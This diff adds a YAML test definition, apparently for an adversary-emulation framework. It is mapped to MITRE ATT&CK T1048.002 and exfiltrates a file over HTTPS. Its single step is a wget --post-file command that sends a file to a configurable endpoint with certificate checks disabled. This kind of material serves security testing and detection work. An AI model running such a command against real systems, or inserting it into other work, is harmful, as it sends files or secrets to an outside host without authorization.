@@ -1,0 +1,30 @@
+api_version: "2.0"
+name: Exfiltrate data in a file over HTTPS using wget
+description: |
+    Exfiltrate data over HTTPS using wget --post-file method
+args:
+    - name: endpoint_domain
+      type: string
+      default: https://example.com/
+    - name: input_file
+      type: path
+      default: PathToAtomicsFolder/T1048.002/src/artifact
+uuid: 7ccdfcfa-6707-46bc-b812-007ab6ff951c
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1048: Exfiltration Over Alternative Protocol'
+    subtechniques:
+        - 'T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: exfiltrate-data-in-a-file-over-https-using-wget
+      inline: |
+        wget --post-file="{{.Args.input_file}}" --timeout=5 --no-check-certificate {{.Args.endpoint_domain}} --delete-after
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
